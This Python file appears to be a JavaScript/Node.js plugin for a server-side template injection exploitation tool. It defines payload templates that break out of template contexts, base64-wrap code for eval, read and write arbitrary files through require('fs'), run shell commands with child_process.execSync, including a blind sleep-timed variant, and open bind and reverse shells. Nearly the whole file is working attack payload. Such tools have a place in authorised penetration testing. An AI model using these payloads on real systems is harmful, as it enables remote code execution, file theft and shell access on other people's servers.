from utils.strings import quote, chunkit, md5
from utils.loggers import log
from plugins.languages import bash
from utils import closures
from core.plugin import Plugin
from utils import rand
import base64
import re


class Javascript(Plugin):
    
    def language_init(self):

        self.update_actions({
            'render' : {
                'call': 'inject',
                'render': """%(code)s""",
                'header': """'%(header)s'+""",
                'trailer': """+'%(trailer)s'""",
                'test_render': 'typeof(%(r1)s)+%(r2)s' % { 
                    'r1' : rand.randints[0],
                    'r2' : rand.randints[1]
                },
                'test_render_expected': 'number%(r2)s' % { 
                    'r2' : rand.randints[1]
                }
            },
            # No evaluate_blind here, since we've no sleep, we'll use inject
            'write' : {
                'call' : 'inject',
                'write' : """require('fs').appendFileSync('%(path)s', Buffer('%(chunk_b64)s', 'base64'), 'binary')//""",
                'truncate' : """require('fs').writeFileSync('%(path)s', '')"""
            },
            'read' : {
                'call': 'render',
                'read' : """require('fs').readFileSync('%(path)s').toString('base64')"""
            },
            'md5' : {
                'call': 'render',
                'md5': """require('crypto').createHash('md5').update(require('fs').readFileSync('%(path)s')).digest("hex")"""
            },
            'evaluate' : {
                'call': 'render',
                'evaluate': """eval(Buffer('%(code_b64)s', 'base64').toString())""",
                'test_os': """require('os').platform()""",
                'test_os_expected': '^[\w-]+$',
            },
            'blind' : {
                'call': 'execute_blind',
                'test_bool_true' : 'true',
                'test_bool_false' : 'false'
            },
            # Not using execute here since it's rendered and requires set headers and trailers
            'execute_blind' : {
                'call': 'inject',
                # execSync() has been introduced in node 0.11, so this will not work with old node versions.
                # TODO: use another function.
                'execute_blind': """require('child_process').execSync(Buffer('%(code_b64)s', 'base64').toString() + ' && sleep %(delay)i')//"""
            },
            'execute' : {
                'call': 'render',
                'execute': """require('child_process').execSync(Buffer('%(code_b64)s', 'base64').toString())""",
                'test_cmd': bash.printf % { 's1': rand.randstrings[2] },
                'test_cmd_expected': rand.randstrings[2] 
            },
            'bind_shell' : {
                'call' : 'execute_blind',
                'bind_shell': bash.bind_shell
            },
            'reverse_shell' : {
                'call': 'execute_blind',
                'reverse_shell' : bash.reverse_shell
            }
        })

        self.set_contexts([

            # Text context, no closures
            { 'level': 0 },

            # This terminates the statement with ;
            { 'level': 1, 'prefix' : '%(closure)s;', 'suffix' : '//', 'closures' : ctx_closures },

            # This does not need termination e.g. if(%s) {}
            { 'level': 2, 'prefix' : '%(closure)s', 'suffix' : '//', 'closures' : ctx_closures },

            # Comment blocks
            { 'level': 5, 'prefix' : '*/', 'suffix' : '/*' },

        ])

    language = 'javascript'

ctx_closures = {
        1: [
            closures.close_single_duble_quotes + closures.integer,
            closures.close_function + closures.empty
        ],
        2: [
            closures.close_single_duble_quotes + closures.integer + closures.string + closures.var,
            closures.close_function + closures.empty
        ],
        3: [
            closures.close_single_duble_quotes + closures.integer + closures.string + closures.var,
            closures.close_function + closures.close_list + closures.close_dict + closures.empty
        ],
        4: [
            closures.close_single_duble_quotes + closures.integer + closures.string + closures.var,
            closures.close_function + closures.close_list + closures.close_dict + closures.empty
        ],
        5: [
            closures.close_single_duble_quotes + closures.integer + closures.string + closures.var,
            closures.close_function + closures.close_list + closures.close_dict + closures.empty,
            closures.close_function + closures.close_list + closures.empty,
        ],
}

